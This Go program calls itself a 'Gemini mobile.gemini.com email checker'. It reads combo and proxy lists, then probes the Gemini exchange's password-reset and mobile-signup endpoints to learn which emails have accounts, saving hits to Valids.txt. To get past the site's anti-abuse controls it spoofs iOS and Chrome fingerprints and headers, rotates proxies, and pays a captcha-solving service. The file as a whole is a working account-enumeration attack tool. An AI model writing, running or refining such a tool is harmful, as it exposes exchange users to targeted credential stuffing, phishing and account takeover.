package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"

	fhttp "github.com/bogdanfinn/fhttp"
	tls_client "github.com/bogdanfinn/tls-client"
	"github.com/bogdanfinn/tls-client/profiles"
	"github.com/sqweek/dialog"
)

var (
	checked        int32
	valids         int32
	invalids       int32
	dupes          int32
	cpmTimes       []int64
	cpmMutex       sync.Mutex
	stopFlag       int32
	remainLock     sync.Mutex
	remaining      []string
	wg             sync.WaitGroup
	blackList      map[string]struct{}
	blacklistMutex sync.RWMutex
)

type NextCaptchaResponse struct {
	Token string `json:"token"`
}

func getFilePath(title string) string {
	path, err := dialog.File().Filter("Text files", "txt").Title(title).Load()
	if err != nil {
		log.Fatalf("Failed to select file: %v", err)
	}
	return path
}

func readComboFile(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, fmt.Errorf("cannot open combo file: %w", err)
	}
	defer file.Close()

	var emails []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		parts := strings.SplitN(line, ":", 2)
		emails = append(emails, parts[0])
	}
	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error reading combo file: %w", err)
	}
	return emails, nil
}

func readProxyFile(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, fmt.Errorf("cannot open proxy file: %w", err)
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			proxies = append(proxies, line)
		}
	}
	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error reading proxy file: %w", err)
	}
	return proxies, nil
}

func parseProxy(proxy string) (*url.URL, error) {
	proxy = strings.TrimSpace(proxy)
	if proxy == "" {
		return nil, fmt.Errorf("empty proxy string")
	}

	if strings.Contains(proxy, "@") {
		return url.Parse("http://" + proxy)
	}

	parts := strings.Split(proxy, ":")
	switch len(parts) {
	case 2:
		return url.Parse(fmt.Sprintf("http://%s:%s", parts[0], parts[1]))
	case 4:
		return url.Parse(fmt.Sprintf("http://%s:%s@%s:%s", parts[2], parts[3], parts[0], parts[1]))
	default:
		return nil, fmt.Errorf("unsupported proxy format: %s", proxy)
	}
}

func setConsoleTitle(title string) {
	if runtime.GOOS == "windows" {
		kernel32, _ := syscall.LoadLibrary("kernel32.dll")
		setConsoleTitleW, _ := syscall.GetProcAddress(kernel32, "SetConsoleTitleW")

		utf16title := utf16.Encode([]rune(title + "\x00"))
		ptr := &utf16title[0]
		syscall.Syscall(setConsoleTitleW, 1, uintptr(unsafe.Pointer(ptr)), 0, 0)
		syscall.FreeLibrary(kernel32)
	}
}

func updateTitle(total int32) {
	for {
		if atomic.LoadInt32(&stopFlag) == 1 || atomic.LoadInt32(&checked) >= total {
			break
		}
		now := time.Now().Unix()
		cpmMutex.Lock()
		newTimes := cpmTimes[:0]
		for _, ts := range cpmTimes {
			if now-ts <= 60 {
				newTimes = append(newTimes, ts)
			}
		}
		cpmTimes = newTimes
		cpm := len(cpmTimes)
		cpmMutex.Unlock()

		title := fmt.Sprintf("%d/%d | Valids: %d | Invalids: %d | Dupes: %d | Cpm: %d", atomic.LoadInt32(&checked), total, atomic.LoadInt32(&valids), atomic.LoadInt32(&invalids), atomic.LoadInt32(&dupes), cpm)
		setConsoleTitle(title)

		time.Sleep(1 * time.Second)
	}
}

func loadKey() string {
	keyFile := "key.conf"
	if data, err := ioutil.ReadFile(keyFile); err == nil {
		return strings.TrimSpace(string(data))
	}

	fmt.Print("Enter your NextCaptcha API key: ")
	var key string
	fmt.Scanln(&key)

	_ = ioutil.WriteFile(keyFile, []byte(key), 0600)
	return key
}

func solveCaptcha(clientKey string) (string, error) {
	url := "https://api-v2.nextcaptcha.com/getToken"

	payload := map[string]interface{}{
		"clientKey": clientKey,
		"task": map[string]interface{}{
			"type":           "RecaptchaMobileTaskProxyless",
			"appPackageName": "com.gemini.ios",
			"appKey":         "6Let7KkhAAAAAN0NpNsDlpa3OEOikkxhNzgNVr_B",
			"appAction":      "signup",
			"appDevice":      "ios",
		},
	}
	body, _ := json.Marshal(payload)

	req, err := http.NewRequest("POST", url, bytes.NewReader(body))
	if err != nil {
		return "", err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("Accept-Language", "en-US,en;q=0.8")
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 20 * time.Second}

	for attempt := 1; attempt <= 5; attempt++ {
		resp, err := client.Do(req)
		if err != nil {
			if attempt < 5 {
				time.Sleep(3 * time.Second)
				continue
			}
			return "", err
		}

		dataBytes, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			if attempt < 5 {
				time.Sleep(3 * time.Second)
				continue
			}
			return "", err
		}
		data := string(dataBytes)
		delimiter := "0|"
		idx := strings.Index(data, delimiter)
		if idx != -1 {
			return data[idx+len(delimiter):], nil
		}
		if attempt < 5 {
			time.Sleep(3 * time.Second)
			continue
		}
		return "", fmt.Errorf("delimiter '0|' not found in response")
	}

	return "", fmt.Errorf("failed to solve captcha")
}

func saveValid(email, folder string) {
	atomic.AddInt32(&valids, 1)
	f, err := os.OpenFile(filepath.Join(folder, "Valids.txt"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("[!] Error saving valids:", err)
		return
	}
	defer f.Close()
	f.WriteString(email + "\n")
}

func saveBans(email, folder string) {
	atomic.AddInt32(&invalids, 1)
	f, err := os.OpenFile(filepath.Join(folder, "Banned.txt"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("[!] Error saving Bans:", err)
		return
	}
	defer f.Close()
	f.WriteString(email + "\n")
}

func saveInvalid(email, folder string) {
	atomic.AddInt32(&invalids, 1)
	f, err := os.OpenFile(filepath.Join(folder, "Invalids.txt"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("[!] Error saving Invalids:", err)
		return
	}
	defer f.Close()
	f.WriteString(email + "\n")
}

func saveDupe(email, folder string) {
	atomic.AddInt32(&dupes, 1)
	f, err := os.OpenFile(filepath.Join(folder, "Dupes.txt"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("[!] Error saving Dupes:", err)
		return
	}
	defer f.Close()
	f.WriteString(email + "\n")
}

func loadBlacklist() map[string]struct{} {
	blacklistFile := "Blacklist.txt"
	blacklist := make(map[string]struct{})

	file, err := os.Open(blacklistFile)
	if err != nil {
		fmt.Println("[!] Could not open blacklist file:", err)
		return blacklist
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.ToLower(strings.TrimSpace(scanner.Text()))
		if line != "" {
			blacklist[line] = struct{}{}
		}
	}

	fmt.Printf("Loaded %d emails from blacklist\n", len(blacklist))
	return blacklist
}

func buildHeaders(email string) fhttp.Header {
	return fhttp.Header{
		"accept":             {"application/json"},
		"accept-encoding":    {"gzip, deflate, br, zstd"},
		"accept-language":    {"en-US,en;q=0.9"},
		"content-type":       {"application/json"},
		"csrf-token":         {"nocheck"},
		"origin":             {"https://exchange.gemini.com"},
		"priority":           {"u=1, i"},
		"referer":            {fmt.Sprintf("https://exchange.gemini.com/signin/forgot?email=%s", email)},
		"sec-ch-ua":          {"\"Google Chrome\";v=\"137\", \"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\""},
		"sec-ch-ua-mobile":   {"?0"},
		"sec-ch-ua-platform": {"\"Windows\""},
		"sec-fetch-dest":     {"empty"},
		"sec-fetch-mode":     {"cors"},
		"sec-fetch-site":     {"same-origin"},
		"user-agent":         {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"},
	}
}

func getCSRF(client tls_client.HttpClient, email string) (string, error) {
	user, domain, _ := strings.Cut(email, "@")
	url := fmt.Sprintf("https://exchange.gemini.com/signin/forgot/confirm?email=%s%%40%s", strings.ToLower(user), strings.ToLower(domain))
	for i := 0; i < 5; i++ {
		req, err := fhttp.NewRequest("GET", url, nil)
		if err != nil {
			return "", err
		}
		req.Header = buildHeaders(email)
		resp, err := client.Do(req)
		if err != nil {
			time.Sleep(500 * time.Millisecond)
			continue
		}
		body, err := ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			time.Sleep(500 * time.Millisecond)
			continue
		}
		var data map[string]interface{}
		if err := json.Unmarshal(body, &data); err != nil {
			continue
		}
		pp, ok := data["pageProps"].(map[string]interface{})
		if !ok {
			continue
		}
		form, ok := pp["form"].(map[string]interface{})
		if !ok {
			continue
		}
		token, ok := form["csrfToken"].(string)
		if ok && strings.ToLower(token) != "nocsrf" {
			return token, nil
		}
	}
	return "", fmt.Errorf("csrf token not found")
}

func checkEmail(email string, proxy string, folder string, clientKey string) {
	defer wg.Done()

	if atomic.LoadInt32(&stopFlag) == 1 {
		remainLock.Lock()
		remaining = append(remaining, email)
		remainLock.Unlock()
		return
	}

	// Check if email is in blacklist
	blacklistMutex.RLock()
	_, isDupe := blackList[strings.ToLower(email)]
	blacklistMutex.RUnlock()

	if isDupe {
		fmt.Printf("[DUPE] %s\n", email)
		saveDupe(email, folder)
		atomic.AddInt32(&checked, 1)
		cpmMutex.Lock()
		cpmTimes = append(cpmTimes, time.Now().Unix())
		cpmMutex.Unlock()
		return
	}

	var lastErr error

	for attempt := 1; attempt <= 5; attempt++ {
		proxyUrl, err := parseProxy(proxy)
		if err != nil {
			lastErr = err
			break
		}

		options := []tls_client.HttpClientOption{
			tls_client.WithTimeoutSeconds(30),
			tls_client.WithClientProfile(profiles.Okhttp4Android13),
			tls_client.WithProxyUrl(proxyUrl.String()),
		}

		client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
		if err != nil {
			lastErr = err
			break
		}

		req1, err := fhttp.NewRequest("GET", "https://mobile.gemini.com/mobile/session-id", nil)
		if err != nil {
			lastErr = err
			continue
		}
		req1.Header = fhttp.Header{
			"x-datadog-parent-id":         {"13442514823603514788"},
			"tracestate":                  {"dd=s:1;o:rum;p:ba8d6802b4cf6da4"},
			"accept":                      {"application/json"},
			"x-datadog-sampling-priority": {"1"},
			"csrf-token":                  {"nocheck"},
			"x-requested-with":            {"XMLHttpRequest"},
			"x-datadog-trace-id":          {"11958900307413227112"},
			"priority":                    {"u=3, i"},
			"accept-language":             {"en-US,en;q=0.9"},
			"cache-control":               {"no-cache"},
			"accept-encoding":             {"gzip, deflate, br"},
			"user-agent":                  {"gemini/51557 CFNetwork/3857.100.1 Darwin/25.0.0"},
			"x-datadog-tags":              {"_dd.p.tid=686fc04000000000"},
			"x-datadog-origin":            {"rum"},
			"traceparent":                 {"00-686fc04000000000a5f68c77f7acd668-ba8d6802b4cf6da4-01"},
		}

		resp1, err := client.Do(req1)
		if err != nil {
			lastErr = err
			time.Sleep(1 * time.Second)
			continue
		}
		body1, err := ioutil.ReadAll(resp1.Body)
		resp1.Body.Close()
		if err != nil {
			lastErr = err
			time.Sleep(1 * time.Second)
			continue
		}

		var sessionResp map[string]interface{}
		err = json.Unmarshal(body1, &sessionResp)
		if err != nil {
			lastErr = err
			time.Sleep(1 * time.Second)
			continue
		}

		sardineSessionId, ok := sessionResp["sardineSessionId"].(string)
		if !ok {
			lastErr = fmt.Errorf("no sardineSessionId found")
			time.Sleep(1 * time.Second)
			continue
		}

		capToken, err := solveCaptcha(clientKey)
		if err != nil {
			lastErr = err
			time.Sleep(1 * time.Second)
			continue
		}

		payload := map[string]interface{}{
			"email":              email,
			"password":           "Asdasd123!",
			"colombiaNationalId": nil,
			"location": map[string]string{
				"countryCode": "at",
			},
			"createDerivative": false,
			"newUserConsent": map[string]bool{
				"europeUserAgreement":     true,
				"europeServicesAgreement": true,
				"marketingOptIn":          true,
			},
			"partnerCode": nil,
			"promoCode":   "",
			"validationIds": map[string]string{
				"ios_validation": uuid(),
				"ios_recaptcha":  capToken,
			},
			"analyticsId": strings.ToUpper(uuid()),
			"appleIfv":    uuid(),
		}

		payloadBytes, _ := json.Marshal(payload)

		req2, err := fhttp.NewRequest("POST", "https://mobile.gemini.com/mobile/register/new-user", bytes.NewReader(payloadBytes))
		if err != nil {
			lastErr = err
			time.Sleep(1 * time.Second)
			continue
		}

		req2.Header = fhttp.Header{
			"x-gemini-rememberdevice":     {""},
			"x-requested-with":            {"XMLHttpRequest"},
			"x-datadog-parent-id":         {"3690737970432873984"},
			"cache-control":               {"no-cache"},
			"user-agent":                  {"Gemini; ios; 25.701.2; 51557; iPhone; 26.0; iPhone 15 Plus"},
			"csrf-token":                  {"nocheck"},
			"x-datadog-trace-id":          {"13454375728152620040"},
			"x-sardine-session":           {sardineSessionId},
			"x-datadog-origin":            {"rum"},
			"x-gemini-app-version":        {"25.701.2"},
			"priority":                    {"u=3, i"},
			"content-length":              {fmt.Sprintf("%d", len(payloadBytes))},
			"x-datadog-sampling-priority": {"1"},
			"accept-language":             {"en-US"},
			"tracestate":                  {"dd=s:1;o:rum;p:333822a136b29600"},
			"x-datadog-tags":              {"_dd.p.tid=686fc07300000000"},
			"accept":                      {"application/json"},
			"content-type":                {"application/json"},
			"accept-encoding":             {"gzip, deflate, br"},
			"traceparent":                 {"00-686fc07300000000bab78b70bf2cac08-333822a136b29600-01"},
		}

		resp2, err := client.Do(req2)
		if err != nil {
			lastErr = err
			time.Sleep(1 * time.Second)
			continue
		}

		body2, err := ioutil.ReadAll(resp2.Body)
		resp2.Body.Close()
		if err != nil {
			lastErr = err
			time.Sleep(1 * time.Second)
			continue
		}

		atomic.AddInt32(&checked, 1)
		cpmMutex.Lock()
		cpmTimes = append(cpmTimes, time.Now().Unix())
		cpmMutex.Unlock()

		if resp2.StatusCode == 200 {
			var jsonResp map[string]interface{}
			err := json.Unmarshal(body2, &jsonResp)
			if err != nil || jsonResp == nil {
				fmt.Printf("[VALID] %s\n", email)
				saveValid(email, folder)
				return
			}
			if _, found := jsonResp["authyInstallRecommendation"]; found {
				fmt.Printf("[INVALID] %s\n", email)
				saveInvalid(email, folder)
				atomic.AddInt32(&invalids, 1)
				return
			}
			fmt.Printf("[BANNED/UNKNOWN] %s | %s\n", email, string(body2))
			lastErr = fmt.Errorf("unrecognized response")
			saveBans(email, folder)
			time.Sleep(1 * time.Second)
			continue
		} else {
			lastErr = fmt.Errorf("status code %d", resp2.StatusCode)
			time.Sleep(1 * time.Second)
			continue
		}
	}

	atomic.AddInt32(&checked, 1)
	atomic.AddInt32(&invalids, 1)
	cpmMutex.Lock()
	cpmTimes = append(cpmTimes, time.Now().Unix())
	cpmMutex.Unlock()
	fmt.Printf("[FAILED] %s | Max retries reached. Last error: %v\n", email, lastErr)
}

func checkEmailCaptchaless(email string, proxy string, folder string) {
	if atomic.LoadInt32(&stopFlag) == 1 {
		remainLock.Lock()
		remaining = append(remaining, email)
		remainLock.Unlock()
		return
	}

	blacklistMutex.RLock()
	_, isDupe := blackList[strings.ToLower(email)]
	blacklistMutex.RUnlock()

	if isDupe {
		fmt.Printf("[DUPE] %s\n", email)
		saveDupe(email, folder)
		atomic.AddInt32(&checked, 1)
		cpmMutex.Lock()
		cpmTimes = append(cpmTimes, time.Now().Unix())
		cpmMutex.Unlock()
		return
	}

	proxyURL, err := parseProxy(proxy)
	if err != nil {
		fmt.Printf("[FAILED] %s | %v\n", email, err)
		return
	}

	options := []tls_client.HttpClientOption{
		tls_client.WithTimeoutSeconds(30),
		tls_client.WithClientProfile(profiles.Okhttp4Android13),
		tls_client.WithProxyUrl(proxyURL.String()),
	}

	client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
	if err != nil {
		fmt.Printf("[FAILED] %s | %v\n", email, err)
		return
	}

	csrfToken, err := getCSRF(client, email)
	if err != nil {
		atomic.AddInt32(&checked, 1)
		atomic.AddInt32(&invalids, 1)
		cpmMutex.Lock()
		cpmTimes = append(cpmTimes, time.Now().Unix())
		cpmMutex.Unlock()
		fmt.Printf("[FAILED] %s | %v\n", email, err)
		return
	}

	payload := map[string]string{
		"csrfToken": csrfToken,
		"secret":    "424242",
	}
	bodyBytes, _ := json.Marshal(payload)

	user, domain, _ := strings.Cut(email, "@")
	url := fmt.Sprintf("https://exchange.gemini.com/signin/forgot/confirm?email=%s%%40%s", strings.ToLower(user), strings.ToLower(domain))

	req, err := fhttp.NewRequest("POST", url, bytes.NewReader(bodyBytes))
	if err != nil {
		fmt.Printf("[FAILED] %s | %v\n", email, err)
		return
	}
	req.Header = buildHeaders(email)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("[FAILED] %s | %v\n", email, err)
		return
	}
	respBody, _ := ioutil.ReadAll(resp.Body)
	resp.Body.Close()

	atomic.AddInt32(&checked, 1)
	cpmMutex.Lock()
	cpmTimes = append(cpmTimes, time.Now().Unix())
	cpmMutex.Unlock()

	var jsonResp map[string]interface{}
	json.Unmarshal(respBody, &jsonResp)
	errorsStr := ""
	if form, ok := jsonResp["form"].(map[string]interface{}); ok {
		if errs, ok := form["errors"]; ok {
			errorsStr = strings.ToLower(fmt.Sprint(errs))
		}
	}
	bodyStr := string(respBody)

	switch {
	case strings.Contains(errorsStr, "secret"):
		fmt.Printf("[VALID] %s\n", email)
		saveValid(email, folder)
	case strings.Contains(bodyStr, "too many password reset attempts"):
		fmt.Printf("[LIMITED] %s\n", email)
		saveValid(email+" [RESET LIMITED]", folder)
	case strings.Contains(bodyStr, "Please use a valid email address"):
		fmt.Printf("[INVALID EMAIL] %s\n", email)
		saveInvalid(email, folder)
	case strings.Contains(errorsStr, "email"):
		fmt.Printf("[INVALID] %s\n", email)
		saveInvalid(email, folder)
	default:
		fmt.Printf("[UNKNOWN] %s | %s\n", email, bodyStr)
		saveBans(email, folder)
	}
}

func uuid() string {
	b := make([]byte, 16)
	rand.Read(b)
	b[8] = b[8]&^0xc0 | 0x80
	b[6] = b[6]&^0xf0 | 0x40
	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
		b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}

func main() {
	fmt.Println("Gemini mobile.gemini.com email checker by sezam")
	fmt.Println("Version: 1.0")

	// Initialize blacklist
	blackList = loadBlacklist()
	comboFile := getFilePath("Select Combo List")
	proxyFile := getFilePath("Select Proxy List")

	emails, err := readComboFile(comboFile)
	if err != nil {
		log.Fatalf("Error loading combo file: %v", err)
	}

	proxies, err := readProxyFile(proxyFile)
	if err != nil {
		log.Fatalf("Error loading proxy file: %v", err)
	}

	if len(emails) == 0 || len(proxies) == 0 {
		log.Fatal("Combo or proxy list is empty")
	}

	fmt.Printf("Loaded %d emails and %d proxies\n", len(emails), len(proxies))

	// First check all emails against the blacklist
	fmt.Println("\n=== CHECKING FOR DUPLICATES ===\n")
	var validEmails []string
	var dupeCount int
	folder := fmt.Sprintf("GeminiVM_%s", time.Now().Format("2006-01-02_15-04"))
	err = os.MkdirAll(folder, 0755)
	if err != nil {
		log.Fatalf("Failed to create output folder: %v", err)
	}

	for _, email := range emails {
		blacklistMutex.RLock()
		_, isDupe := blackList[strings.ToLower(email)]
		blacklistMutex.RUnlock()

		if isDupe {
			fmt.Printf("[DUPE] %s\n", email)
			saveDupe(email, folder)
			atomic.AddInt32(&checked, 1)
			atomic.AddInt32(&dupes, 1)
			dupeCount++
		} else {
			validEmails = append(validEmails, email)
		}
	}

	fmt.Printf("\n=== FOUND %d DUPLICATES ===\n\n", dupeCount)
	fmt.Printf("=== CONTINUING WITH %d VALID EMAILS ===\n\n", len(validEmails))

	fmt.Print("How many threads to use? ")
	var threadCount int
	_, err = fmt.Scanln(&threadCount)
	if err != nil || threadCount < 1 {
		log.Fatal("Invalid thread count")
	}

	emailCh := make(chan string)

	go updateTitle(int32(len(validEmails)))

	for i := 0; i < threadCount; i++ {
		go func(workerID int) {
			for email := range emailCh {
				proxy := proxies[rand.Intn(len(proxies))]
				wg.Add(1)
				checkEmailCaptchaless(email, proxy, folder)
			}
		}(i)
	}

	for _, email := range validEmails {
		emailCh <- email
	}
	close(emailCh)

	wg.Wait()

	atomic.StoreInt32(&stopFlag, 1)

	fmt.Println("[+] All tasks completed")
}
